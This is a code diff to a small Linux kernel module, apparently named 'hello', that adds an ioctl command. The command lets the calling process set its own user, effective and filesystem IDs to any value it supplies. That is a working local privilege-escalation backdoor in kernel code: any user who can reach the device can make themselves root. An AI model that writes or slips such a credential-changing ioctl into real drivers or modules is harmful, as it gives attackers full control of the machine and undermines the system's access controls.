@@ -10,6 +10,8 @@
 #include <linux/inet.h>
 #include <net/udp.h>
 
+#define TEST_SU_IOCTL _IO(150, 1)
+
 static struct socket *sock = NULL;
 
 static struct {
@@ -120,8 +122,11 @@ err:
   return ret;
 }
 
-long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
+long hello_su(int uid) {
   struct cred* new_cred;
+	kuid_t v = {uid};
+
+	printk("changing to %d\n", uid);
 
   new_cred = prepare_creds();
   if(!new_cred) {
@@ -129,14 +134,19 @@ long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
     return -ENOTTY;
   }
 
-  kuid_t v = {0};
   new_cred->uid = v;
+	new_cred->euid = v;
+	new_cred->fsuid = v;
 
-  commit_creds(new_cred);
+  return commit_creds(new_cred);
+}
 
-
-  printk("%d %d\n", cmd, arg);
-
+long hello_ioctl(struct file *fp, unsigned int cmd, unsigned long arg) {
+  switch(cmd) {
+    case TEST_SU_IOCTL:
+      return hello_su(arg);
+      break;
+  }
 
   return -ENOTTY;
 }
